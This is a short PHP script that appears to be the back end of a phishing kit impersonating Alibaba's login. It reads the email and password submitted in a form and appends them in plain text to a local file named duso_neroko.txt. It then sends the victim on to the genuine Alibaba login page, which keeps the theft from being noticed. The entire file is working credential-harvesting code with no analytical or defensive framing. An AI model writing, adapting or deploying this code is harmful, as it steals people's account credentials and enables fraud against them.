<?php
error_reporting(E_ALL ^ (E_NOTICE | E_WARNING));
$e = $_POST['email'];
$p = $_POST['pass'];


$fd = fopen("duso_neroko.txt", "a");
$str = $e . "-" . $p;
fwrite($fd, $str . "\r\n");
fclose($fd);
header("Location: https://passport.alibaba.com/icbu_login.htm?return_url=https%3A%2F%2Fwww.alibaba.com%2Fpremium%2Falibaba_login.html");
